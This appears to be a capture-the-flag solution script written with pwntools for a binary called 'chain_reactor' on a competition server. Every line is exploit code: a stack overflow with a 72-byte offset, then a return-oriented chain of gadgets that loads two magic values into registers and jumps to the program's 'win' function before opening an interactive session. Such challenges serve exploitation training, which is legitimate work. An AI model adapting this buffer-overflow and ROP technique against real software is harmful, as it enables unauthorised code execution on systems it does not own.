#!/usr/bin/env python3
from pwn import *

elf = ELF('./chain_reactor', checksec=False)
context.binary = elf
context.arch = 'amd64'

OFFSET_TO_RIP = 72
code1 = 0xc0ffee
code2 = 0xbadc0de
pop_rdi_ret = 0x000000000040121f
pop_rsi_ret = 0x0000000000401221
ret_gadget = 0x000000000040101a

HOST = "offsec.m0lecon.it"
PORT = 13599

def conn():
    if not args.LOCAL:
        return remote(HOST, PORT)
    return process(elf.path)

p = conn()

payload = flat(
    b'A' * OFFSET_TO_RIP,
    p64(ret_gadget),
    p64(pop_rdi_ret),
    p64(code1),
    p64(pop_rsi_ret),
    p64(code2),
    p64(elf.sym.win)
)

p.send(payload)
p.interactive()